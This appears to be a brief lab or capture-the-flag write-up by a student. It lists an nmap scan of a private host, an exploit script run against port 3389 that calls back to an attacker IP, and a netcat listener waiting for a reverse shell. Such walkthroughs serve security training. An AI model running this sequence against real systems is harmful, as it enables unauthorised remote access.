# Telaldruhn 192.168.2.9
## Andrea Zonnekus 18758119

sudo nmap -p- -O -sV -oN host -Pn -sC 192.168.2.9

![](tel_aldruhn2_steps/Aspose.Words.6509d46c-f730-48c4-bead-7e0a960e53b2.001.png)

python3 exploit.py 192.168.2.9 -rp 3389 10.8.0.106

![](tel_aldruhn2_steps/Aspose.Words.6509d46c-f730-48c4-bead-7e0a960e53b2.002.png)

nc -lvnp 4444

![](tel_aldruhn2_steps/Aspose.Words.6509d46c-f730-48c4-bead-7e0a960e53b2.003.png)
